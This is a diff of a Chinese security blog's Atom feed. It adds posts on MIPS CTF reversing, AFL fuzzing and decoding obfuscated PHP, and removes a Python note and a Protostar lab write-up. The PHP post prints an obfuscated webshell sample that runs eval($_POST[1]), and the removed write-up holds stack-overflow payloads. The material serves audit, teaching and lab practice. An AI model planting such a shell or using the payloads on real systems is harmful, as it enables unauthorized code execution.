@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://weaponx.site/"/>
-  <updated>2018-04-11T09:51:55.833Z</updated>
+  <updated>2018-05-23T05:50:05.417Z</updated>
   <id>http://weaponx.site/</id>
   
   <author>
@@ -14,6 +14,191 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DDCTF REVERSE baby_mips</title>
+    <link href="http://weaponx.site/2018/05/23/DDCTF-REVERSE-baby-mips/"/>
+    <id>http://weaponx.site/2018/05/23/DDCTF-REVERSE-baby-mips/</id>
+    <published>2018-05-23T05:48:37.000Z</published>
+    <updated>2018-05-23T05:50:05.417Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>最近一直在研究IoT设备的安全，而在IoT设备上程序很多都是MIPS架构的。所以对MIPS指令有一定研究，而在DDCTF 2018中刚好有一道逆向题目是MIPS程序，于是尝试做了一下。</p>
+<a id="more"></a>
+<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>由于我们通常的操作系统指令集都是x86的，所以无法跑MIPS程序。这时候就需要装QEMU来模拟，QEMU通过源码编译较为复杂，我们又没有特殊的需求，所以直接使用<code>ubuntu</code>的APT进行安装即可。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">sudo apt install qemu</div></pre></td></tr></table></figure>
+<p>由于MIPS架构有两种——大端MIPS和小端MIPS。所以，我们需要确定这个程序是大端MIPS还是小端MIPS。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">user@ubuntu ~ file baby_mips </div><div class="line">baby_mips: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, stripped</div></pre></td></tr></table></figure>
+<p><code>ELF 32-bit LSB</code>很明显，这个程序是32位小端的MIPS。所以，我们使用<code>qemu-mipsel baby_mips</code>来运行这个程序。因为我们需要远程调试MIPS程序，所以要加上<code>-g 端口</code>参数，<code>qemu-mipsel -g 1234 baby_mips</code>，此时用IDA pro就可以通过<code>Remote GDB Server</code>来调试这个MIPS程序。</p>
+<h2 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02 题目分析"></a>0x02 题目分析</h2><p>直接打开IDA来载入程序，搜索字符串，可以看到</p>
+<p><img src="1.png" alt=""></p>
+<p>查找这个字符串的交叉引用，直接到<code>sub_403238</code>。</p>
+<p><img src="2.png" alt=""></p>
+<p>可以看到一个简单的</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;最近一直在研究IoT设备的安全，而在IoT设备上程序很多都是MIPS架构的。所以对MIPS指令有一定研究，而在DDCTF 2018中刚好有一道逆向题目是MIPS程序，于是尝试做了一下。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="二进制" scheme="http://weaponx.site/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>American Fuzz Lop (AFL) Fuzz 初探</title>
+    <link href="http://weaponx.site/2018/05/17/American-Fuzz-Lop-AFL-Fuzz-%E5%88%9D%E6%8E%A2/"/>
+    <id>http://weaponx.site/2018/05/17/American-Fuzz-Lop-AFL-Fuzz-初探/</id>
+    <published>2018-05-17T05:41:52.000Z</published>
+    <updated>2018-05-23T05:44:29.450Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x00-AFL-基础"><a href="#0x00-AFL-基础" class="headerlink" title="0x00 AFL 基础"></a>0x00 AFL 基础</h3><p><code>American Fuzz Lop</code>简称 <code>AFL</code>，是一款模糊测试工具。模糊测试（<a href="https://baike.baidu.com/item/Fuzzing" target="_blank" rel="external">Fuzzing</a>），是一种通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞的方法。通常的流程：提供一个正常的输入；修改一部分内容；输入给程序；观察程序的处理过程是否异常。</p>
+<a id="more"></a>
+<p>环境</p>
+<ul>
+<li>Ubuntu 16.04 LTS X86_64</li>
+</ul>
+<p>安装</p>
+<p><code>apt install afl</code></p>
+<p>如果大家需要较新版本的AFL，也可通过AFL的官网下载源码自行编译。</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><div class="line">wget http:<span class="regexp">//</span>lcamtuf.coredump.cx<span class="regexp">/afl/</span>releases<span class="regexp">/afl-latest.tgz</span></div></pre></td></tr></table></figure>
+<h3 id="0x01-AFL的FUZZ模式"><a href="#0x01-AFL的FUZZ模式" class="headerlink" title="0x01 AFL的FUZZ模式"></a>0x01 AFL的FUZZ模式</h3><p>AFL同时支持两种Fuzz模式：</p>
+<ol>
+<li>有源码模式</li>
+<li>无源码模式（<code>afl-qemu</code>）</li>
+</ol>
+<h4 id="有源码模式"><a href="#有源码模式" class="headerlink" title="有源码模式"></a>有源码模式</h4><p>使用AFL来进行有源码fuzz基本上是依赖于AFL中的代码插桩。使用有源码模式需要使用afl-clang或afl-clang++来编译。</p>
+<p>我们以UPX为例，讲解使用AFL来fuzz UPX。</p>
+<p>首先，我们从github上下载UPX的代码，随后进入到src文件夹后使用如下命令编译。</p>
+<p><code>make CC=&quot;afl-clang&quot; CXX=&quot;afl-clang++&quot; -j16</code></p>
+<p>其中CC为c语言的编译器，CXX为c++语言的编译器。</p>
+<p>不过，报了如下的错误<br><img src="1.png" alt=""></p>
+<p>这个是由于没有<code>upx-lzma-sdk</code>导致的，我们需要从github下载这个sdk放到<code>lzma-sdk</code>文件夹下</p>
+<p><img src="2.png" alt=""></p>
+<p>接着继续编译，会报这些错误</p>
+<p><img src="3.png" alt=""></p>
+<p>这个是由于没有安装libucl库导致的，我们安装一下即可<code>sudo apt install libucl-dev</code>。安装完成后，我们继续编译。然后报了一个这个错</p>
+<p><img src="4.png" alt=""></p>
+<p>需要修改文件<code>src/stub/scripts/check_whitespace.sh</code>将下图部分注释掉</p>
+<p><img src="5.png" alt=""></p>
+<p>继续编译，会在当前目录下生成文件<code>upx.out，这个就是upx的程序本身了</code>。接着我们就可以使用afl来fuzz这个UPX程序。首先我们创建输入文件夹fuzz_input和输出文件夹fuzz_output，将一个ELF文件拷贝到输入文件夹中。随后执行命令</p>
+<p><code>afl-fuzz -i fuzz_input -o fuzz_output ./upx.out -1 @@ -o /dev/null</code></p>
+<p>这里面，afl会用自己生成的testcase替换@@。不过，执行后程序又报错了，如下图</p>
+<p><img src="6.png" alt=""></p>
+<p>这是因为，没有开启系统的coredump，我们用它的命令开启系统的coredump。开启完成后，我们继续执行fuzz的命令，就可以看到如下界面了。此时，afl已经开始fuzz UPX程序了</p>
+<p><img src="7.png" alt=""></p>
+<p>如果程序有崩溃，afl会将崩溃的样本放在fuzz_output中，我们就可以详细进行分析了。</p>
+<h4 id="无源码模式"><a href="#无源码模式" class="headerlink" title="无源码模式"></a>无源码模式</h4><p>AFL的无源码模式的fuzz依赖于qemu虚拟化。我们使用apt方式安装的afl没有<code>afl-qemu-trace</code>(不支持使用QEMU模式)，所以我们需要下载afl的源码自己编译。</p>
+<p>下载解压后，我们通过make直接编译。编译完成后，需要配置qemu环境。不过，afl提供了一个脚本，在qemu-mode文件夹下的<code>build_qemu_support.sh</code>。我们运行一下这个脚本来配置qemu环境。运行后会提示libtool没有安装，我们使用<code>sudo apt install libtool-bin</code>安装即可。</p>
+<p>QEMU环境配置完成后提示</p>
+<p><img src="8.png" alt=""></p>
+<p>然后使用命令<code>afl-fuzz -i fuzz_input -o fuzz_output1 -Q -m 200 ./upx.out -1 @@ -o /dev/null</code>即可开始fuzz，如图。</p>
+<p><img src="10.png" alt=""></p>
+<h3 id="0x02-分布式fuzz"><a href="#0x02-分布式fuzz" class="headerlink" title="0x02 分布式fuzz"></a>0x02 分布式fuzz</h3><p>在使用afl-fuzz时，每个进程只会占用一个CPU核心。如果我们的机器是多核处理器，我们可以通过进行分布式fuzz来提高fuzz速度。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">afl-fuzz -i input_dir -o fuzz_output -M master ./<span class="built_in">test</span> @@</div><div class="line">afl-fuzz -i input_dir -o fuzz_output -S slave1 ./<span class="built_in">test</span> @@</div></pre></td></tr></table></figure>
+<p>注意，这里<code>-o</code>跟的参数一定要保持一致，这个是用来同步各个fuzz进程的。</p>
+<p>若分布式意外退出可以使用以下命令继续fuzz任务。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">afl-fuzz -i- -o fuzz_output -M master ./<span class="built_in">test</span> @@</div><div class="line">afl-fuzz -i- -o fuzz_output -S slave1 ./<span class="built_in">test</span> @@</div></pre></td></tr></table></figure>
+<p>最后祝大家早日FUZZ到属于自己的漏洞。</p>
+<h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><p><a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="external">http://lcamtuf.coredump.cx/afl/</a> </p>
+<p><a href="https://baike.baidu.com/item/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/2848962" target="_blank" rel="external">https://baike.baidu.com/item/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/2848962</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x00-AFL-基础&quot;&gt;&lt;a href=&quot;#0x00-AFL-基础&quot; class=&quot;headerlink&quot; title=&quot;0x00 AFL 基础&quot;&gt;&lt;/a&gt;0x00 AFL 基础&lt;/h3&gt;&lt;p&gt;&lt;code&gt;American Fuzz Lop&lt;/code&gt;简称 &lt;code&gt;AFL&lt;/code&gt;，是一款模糊测试工具。模糊测试（&lt;a href=&quot;https://baike.baidu.com/item/Fuzzing&quot;&gt;Fuzzing&lt;/a&gt;），是一种通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞的方法。通常的流程：提供一个正常的输入；修改一部分内容；输入给程序；观察程序的处理过程是否异常。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="二进制" scheme="http://weaponx.site/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>解密混淆的PHP程序</title>
+    <link href="http://weaponx.site/2018/04/27/%E8%A7%A3%E5%AF%86%E6%B7%B7%E6%B7%86%E7%9A%84PHP%E7%A8%8B%E5%BA%8F/"/>
+    <id>http://weaponx.site/2018/04/27/解密混淆的PHP程序/</id>
+    <published>2018-04-27T05:45:39.000Z</published>
+    <updated>2018-05-23T05:46:46.051Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>团队大佬在做PHP代码审计的时候发现PHP代码是被混淆过的。虽然可以通过自己手动解密可以还原原先的PHP代码，但是混淆过程比较复杂且自己写脚本还原非常麻烦。所以，我这边通过PHP底层的操作对混淆后的PHP代码进行还原。</p>
+<a id="more"></a>
+<h2 id="0x02-PHP代码混淆"><a href="#0x02-PHP代码混淆" class="headerlink" title="0x02 PHP代码混淆"></a>0x02 PHP代码混淆</h2><p>PHP代码混淆一般来说有两种方法：</p>
+<ul>
+<li>需要PHP扩展</li>
+<li>无需PHP扩展</li>
+</ul>
+<p>本文我们主要讲解无需PHP扩展的代码混淆的解密。大多数的无需扩展的php代码混淆原理上都是使用eval进行代码的执行。如果我们能够得到<code>eval</code>函数的参数，即可获得解密后的代码。</p>
+<p>不过，一般来说PHP的混淆都会通过多次<code>eval</code>来还原并执行php代码，所以我们可以通过hook PHP的eval函数来打印其参数来解密代码。</p>
+<h2 id="0x03-hook-eval"><a href="#0x03-hook-eval" class="headerlink" title="0x03 hook eval"></a>0x03 hook eval</h2><p>PHP中的eval函数在Zend里需要调用<code>zend_compile_string</code>函数，我们可以通过调试看看<code>zend_compile_string</code>函数。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">user@ubuntu ~/php-5.6.35/Zend ~ grep -rn <span class="string">"zend_compile_string"</span> *</div><div class="line">zend.c:693: zend_compile_string = compile_string;</div></pre></td></tr></table></figure>
+<p>我们发现<code>zend_compile_string</code>函数其实就是<code>compile_string</code>函数。所以我们可以通过写一个简单的PHP代码，看能否在<code>compile_string</code>中获取到<code>eval</code>参数的值</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">eval</span>(<span class="string">"phpinfo();"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>首先我们编译一下下载好的PHP。注意，由于我们后面要进行调试，所以要在编译时加上<code>-g</code>参数，加调试符号。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">./configure CFLAGS=<span class="string">"-g"</span> CXXFLAGS=<span class="string">"-g"</span></div><div class="line">make -j16</div></pre></td></tr></table></figure>
+<p>接着我们使用gdb调试php程序。首先设置程序的参数，且在<code>compile_string</code>函数下好断点。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ <span class="built_in">set</span> args xxx.php</div><div class="line">gdb-peda$ b compile_string</div><div class="line">Breakpoint 1 at 0x6b4480: file Zend/zend_language_scanner.l, line 716.</div></pre></td></tr></table></figure>
+<p>然后让php程序跑起来</p>
+<p><img src="1.png" alt=""></p>
+<p>发现程序断下来后，我们发现<code>compile_string</code>的第一个参数<code>source_string</code>为php代码中<code>eval</code>函数的参数在Zend中的结构——即<code>zval_struct</code>。<code>source_string.value.str.val</code>即为参数的字符串形式。</p>
+<ul>
+<li>通过修改<code>compile_string</code>函数来打印<code>eval</code>的参数，代码如下</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> (Z_TYPE_P(source_string) == IS_STRING)                          <span class="comment">// 判断是否为string类型</span></div><div class="line">&#123;</div><div class="line">    len = Z_STRLEN_P(source_string);                               <span class="comment">// 求string的长度</span></div><div class="line">    str = estrndup(Z_STRVAL_P(source_string), len);                <span class="comment">// 拷贝到str中</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n==================DUMP_CODE====================\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str);                                           <span class="comment">//打印</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n==================DUMP_CODE====================\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>修改好之后重新编译php，运行被加密的php代码</p>
+<p><img src="2.png" alt=""></p>
+<p>解密后的PHP代码如下</p>
+<p><img src="3.png" alt=""></p>
+<p>可以看到已经完全还原了被混淆的PHP代码</p>
+<ul>
+<li>通过编写php扩展来解密php脚本</li>
+</ul>
+<p>编写php扩展的原理就是用我们的函数hook <code>zend_compile_string</code>函数，将函数的参数打印出来后再交还给<code>zend_compile_string</code>函数执行即可。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">./ext/ext_skel --extname=decrypt_code</div></pre></td></tr></table></figure>
+<p>首先，我们写一个自己的hook函数。此函数的功能就是判断<code>eval</code>函数的参数是否为字符串，如果不是，则按原路径执行；如果是，则将参数打印出来后按照原路径执行。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> zend_op_array *<span class="title">decrypt_code_compile_string</span><span class="params">(zval *source_string, <span class="keyword">char</span> *filename TSRMLS_DC)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> len;</div><div class="line">    <span class="keyword">char</span> *str;</div><div class="line">    <span class="keyword">if</span> (Z_TYPE_P(source_string) != IS_STRING)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> orig_zend_compile_string(source_string, filename TSRMLS_CC);</div><div class="line">    &#125;</div><div class="line">    len  = Z_STRLEN_P(source_string);</div><div class="line">    str = estrndup(Z_STRVAL_P(source_string), len);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n==========DUMP===========\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, str);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n==========DUMP===========\n"</span>);</div><div class="line">    <span class="keyword">return</span> orig_zend_compile_string(source_string, filename TSRMLS_CC);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>接着，我们修改PHP扩展加载函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">PHP_MINIT_FUNCTION(decrypt_code)</div><div class="line">&#123;</div><div class="line">    <span class="comment">/* If you have INI entries, uncomment these lines </span></div><div class="line">    REGISTER_INI_ENTRIES();</div><div class="line">    */</div><div class="line">    orig_compile_string = zend_compile_string;</div><div class="line">    zend_compile_string = decrypt_code_compile_string;</div><div class="line">    <span class="keyword">return</span> SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>此函数的功能就是保存<code>zend_compile_string</code>函数的地址，接着用我们的hook函数替换<code>zend_compile_string</code>的地址。当<code>eval</code>函数调用<code>zend_compile_string</code>时，就调用了我们的hook函数。</p>
+<p>最后，我们修改PHP扩展的卸载函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">PHP_MSHUTDOWN_FUNCTION(decrypt_code)</div><div class="line">&#123;</div><div class="line">    <span class="comment">/* uncomment this line if you have INI entries</span></div><div class="line">    UNREGISTER_INI_ENTRIES();</div><div class="line">    */</div><div class="line">    zend_compile_string = orig_zend_compile_string;</div><div class="line">    <span class="keyword">return</span> SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>当这个扩展被卸载的时候将函数的hook解除。</p>
+<p>最后，编译我们的扩展</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">phpize</div><div class="line">./configure --with-php-config=/usr/<span class="built_in">local</span>/php/bin/php-config</div><div class="line">make</div></pre></td></tr></table></figure>
+<p>接着，在php.ini中加上我们的扩展。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line">extension=decrypt_code.so</div></pre></td></tr></table></figure>
+<p>运行此脚本也可得到同样的输出。</p>
+<h2 id="0x04-利用其他函数还原的解密"><a href="#0x04-利用其他函数还原的解密" class="headerlink" title="0x04 利用其他函数还原的解密"></a>0x04 利用其他函数还原的解密</h2><p>其实，混淆代码的解密就是类似于代码执行。最终还是要执行PHP代码，而执行PHP代码的方法很多，除了<code>eval</code>函数还有<code>assert</code>、<code>call_user_func</code>、<code>call_user_func_array</code>、<code>create_function</code>等。这些函数的底层也是调用了<code>zend_compile_string</code>，所以也可以利用hook <code>eval</code>来还原混淆后的加密代码。</p>
+<h2 id="0x05-Example"><a href="#0x05-Example" class="headerlink" title="0x05 Example"></a>0x05 Example</h2><p>一段示例代码。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$_uU=chr(<span class="number">99</span>).chr(<span class="number">104</span>).chr(<span class="number">114</span>);$_cC=$_uU(<span class="number">101</span>).$_uU(<span class="number">118</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">108</span>).$_uU(<span class="number">40</span>).$_uU(<span class="number">36</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">80</span>).$_uU(<span class="number">79</span>).$_uU(<span class="number">83</span>).$_uU(<span class="number">84</span>).$_uU(<span class="number">91</span>).$_uU(<span class="number">49</span>).$_uU(<span class="number">93</span>).$_uU(<span class="number">41</span>).$_uU(<span class="number">59</span>);$_fF=$_uU(<span class="number">99</span>).$_uU(<span class="number">114</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">102</span>).$_uU(<span class="number">117</span>).$_uU(<span class="number">110</span>).$_uU(<span class="number">99</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">105</span>).$_uU(<span class="number">111</span>).$_uU(<span class="number">110</span>);$_=$_fF(<span class="string">""</span>,$_cC);@$_();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>运行一下，得到解密后的结果。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">./php 3.php </div><div class="line"></div><div class="line">=====================DUMP_CODE========================</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">__lambda_func</span></span>()&#123;<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);&#125;</div><div class="line"></div><div class="line">=====================DUMP_CODE========================</div></pre></td></tr></table></figure>
+<h2 id="0x06-Refer"><a href="#0x06-Refer" class="headerlink" title="0x06 Refer"></a>0x06 Refer</h2><p><a href="http://blog.evalbug.com/2017/09/21/phpdecode_01/" target="_blank" rel="external">http://blog.evalbug.com/2017/09/21/phpdecode_01/</a></p>
+<p><a href="https://security.tencent.com/index.php/blog/msg/19" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/19</a></p>
+<p><a href="http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html" target="_blank" rel="external">http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html</a></p>
+<p><a href="https://lightless.me/archives/Zend-Extension-PHP-WAF.html" target="_blank" rel="external">https://lightless.me/archives/Zend-Extension-PHP-WAF.html</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;团队大佬在做PHP代码审计的时候发现PHP代码是被混淆过的。虽然可以通过自己手动解密可以还原原先的PHP代码，但是混淆过程比较复杂且自己写脚本还原非常麻烦。所以，我这边通过PHP底层的操作对混淆后的PHP代码进行还原。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="二进制" scheme="http://weaponx.site/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
+    
+  </entry>
   
   <entry>
     <title>正式入驻腾讯云</title>
@@ -888,129 +1073,6 @@
     
     
       <category term="博客" scheme="http://weaponx.site/tags/%E5%8D%9A%E5%AE%A2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>python如何调用__del__及全局变量如何存储</title>
-    <link href="http://weaponx.site/2017/04/12/python%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8-del-%E5%8F%8A%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%A6%82%E4%BD%95%E5%AD%98%E5%82%A8/"/>
-    <id>http://weaponx.site/2017/04/12/python如何调用-del-及全局变量如何存储/</id>
-    <published>2017-04-13T02:05:28.000Z</published>
-    <updated>2017-04-13T02:06:19.018Z</updated>
-    
-    <content type="html"><![CDATA[<p>在处理一个bug的时候发现程序一直报错，<code>Exception exceptions.NameError: &quot;global name &#39;TEST&#39; is not defined&quot;</code>。仔细审查了下源码，发现这个<code>TEST</code>变量是个全局变量，已经定义了。只不过在类的析构函数<code>__del__()</code>中解引用了<code>del TEST</code>。</p>
-<p>这引出了两个问题：</p>
-<ol>
-<li>一个类的对象，什么时候调用析构函数？</li>
-<li>为什么一个对象把<code>TEST</code>解引用了其他对象也无法访问？</li>
-</ol>
-<a id="more"></a>
-<h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>在C/C++中，需要程序员自己完成垃圾回收。而在python中，是python自己完成垃圾回收工作的。在python中每个变量都有一个引用计数器来表示这个变量被引用的次数。当这个计数器为0的时候，python就会对这个变量进行垃圾回收（也就是调用类中的析构函数<code>__del__()</code>）。</p>
-<p>下面有一个示例</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">()</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"This is Init Function"</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"This is Del Function"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></div><div class="line">    t = Test()</div><div class="line">    <span class="keyword">print</span> <span class="string">"Boom shakalaka"</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"Before run test()"</span></div><div class="line">    test()</div><div class="line">    <span class="keyword">print</span> <span class="string">"After run test()"</span></div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">"Before Create Object"</span></div><div class="line">    t1 = Test()</div><div class="line">    <span class="keyword">print</span> <span class="string">"After Create Object"</span></div></pre></td></tr></table></figure>
-<p>我们看看执行后的结果</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">Before run <span class="built_in">test</span>()</div><div class="line">This is Init Function</div><div class="line">Boom shakalaka</div><div class="line">This is Del Function</div><div class="line">After run <span class="built_in">test</span>()</div><div class="line">Before Create Object</div><div class="line">This is Init Function</div><div class="line">After Create Object</div><div class="line">This is Del Function</div></pre></td></tr></table></figure>
-<p>在执行<code>test()</code>函数的时候执行完成后，Test()的对象t被回收，调用析构函数<code>__del__</code>打印<code>This is Del Function</code>。</p>
-<h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>在python中，全局变量使用共享内存的方式实现的。若一个对象解引用后，其他所有对象均无法访问。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">()</span>:</span></div><div class="line">    name = <span class="string">"test"</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">del</span> Test.name</div><div class="line">        <span class="keyword">print</span> <span class="string">"This is Del Function"</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    t1 = Test()</div><div class="line">    t2 = Test()</div></pre></td></tr></table></figure>
-<p>执行后会报错</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">This is Del Function</div><div class="line">Exception AttributeError: <span class="string">"'NoneType' object has no attribute 'name'"</span> <span class="keyword">in</span> &lt;bound method Test.__del__ of &lt;__main__.Test instance at 0x7f4dde73fd40&gt;&gt; ignored</div></pre></td></tr></table></figure>
-<p>原因是在清除t1的时候对全局变量name解引用，导致t2调用析构函数时候访问异常。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;在处理一个bug的时候发现程序一直报错，&lt;code&gt;Exception exceptions.NameError: &amp;quot;global name &amp;#39;TEST&amp;#39; is not defined&amp;quot;&lt;/code&gt;。仔细审查了下源码，发现这个&lt;code&gt;TEST&lt;/code&gt;变量是个全局变量，已经定义了。只不过在类的析构函数&lt;code&gt;__del__()&lt;/code&gt;中解引用了&lt;code&gt;del TEST&lt;/code&gt;。&lt;/p&gt;
-&lt;p&gt;这引出了两个问题：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;一个类的对象，什么时候调用析构函数？&lt;/li&gt;
-&lt;li&gt;为什么一个对象把&lt;code&gt;TEST&lt;/code&gt;解引用了其他对象也无法访问？&lt;/li&gt;
-&lt;/ol&gt;
-    
-    </summary>
-    
-      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
-    
-    
-      <category term="python" scheme="http://weaponx.site/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Exploit-Exercises Protostar writeup PART I</title>
-    <link href="http://weaponx.site/2017/04/11/Exploit-Exercises-Protostar-writeup-PART-I/"/>
-    <id>http://weaponx.site/2017/04/11/Exploit-Exercises-Protostar-writeup-PART-I/</id>
-    <published>2017-04-11T06:48:37.000Z</published>
-    <updated>2017-04-11T06:51:42.437Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="stack0"><a href="#stack0" class="headerlink" title="stack0"></a>stack0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x44*'a'"</span> | ./stack0</div><div class="line">you have changed the <span class="string">'modified'</span> variable</div></pre></td></tr></table></figure>
-<h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x40*'a'+'\x64\x63\x62\x61'"</span> | xargs ./stack1</div><div class="line">you have correctly got the variable to the right value</div></pre></td></tr></table></figure>
-<h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span> + <span class="string">'\x0a\x0d\x0a\x0d'</span></div><div class="line">os.putenv(<span class="string">"GREENIE"</span>, payload)</div><div class="line">os.system(<span class="string">"./stack2"</span>)</div></pre></td></tr></table></figure>
